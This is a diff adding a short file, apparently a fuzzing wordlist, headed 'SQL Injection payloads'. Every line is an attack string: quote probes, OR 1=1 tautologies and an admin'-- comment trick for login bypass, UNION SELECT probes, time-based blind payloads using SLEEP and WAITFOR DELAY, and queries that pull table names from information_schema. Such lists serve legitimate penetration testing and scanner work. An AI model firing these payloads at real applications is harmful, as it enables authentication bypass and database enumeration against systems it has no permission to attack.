@@ -1,0 +1,16 @@
+# SQL Injection payloads
+'
+"
+' OR '1'='1
+' OR 1=1--
+" OR 1=1--
+' OR '1'='1'--
+1' OR '1'='1
+admin'--
+') OR ('1'='1
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' AND SLEEP(2)--
+'; WAITFOR DELAY '0:0:2'--
+1 AND 1=2 UNION SELECT table_name FROM information_schema.tables--
+' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
